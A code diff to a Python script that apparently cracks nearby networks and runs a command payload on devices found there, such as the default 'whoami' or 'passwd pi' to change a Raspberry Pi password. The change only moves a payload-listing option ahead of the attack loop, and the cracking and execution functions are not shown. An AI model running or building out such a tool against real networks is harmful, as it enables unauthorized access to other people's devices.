@@ -12,6 +12,8 @@ parser.add_argument('--payload', type=str, default='whoami',
 
 args = parser.parse_args()
 
+list_mode = args.list
+
 payloads = {
 	'password': '"passwd pi"'
 }
@@ -36,19 +38,22 @@ def intro():
 
 intro()
 
-print("Searching for vulnerable networks...")
-successful_networks = bust()
-
-if successful_networks:
-	if args.payload in payloads:
-		payload = payloads[args.payload]
-	else:
-		payload = args.payload
-
-	for network in successful_networks:
-		print(f"Beginning the hunt on {network['network']}...")
-		connect_to_network(network['network'], network['password'], platform.system())
-		let_the_hunt_begin(payload)
-		print("")
-elif args.list:
+if (list_mode):
 	list_payloads()
+	exit()
+else:
+	print("Searching for vulnerable networks...")
+	successful_networks = bust()
+
+	if successful_networks:
+		if args.payload in payloads:
+			payload = payloads[args.payload]
+		else:
+			payload = args.payload
+
+		for network in successful_networks:
+			print(f"Beginning the hunt on {network['network']}...")
+			connect_to_network(network['network'], network['password'], platform.system())
+			let_the_hunt_begin(payload)
+			print("")
+	exit()
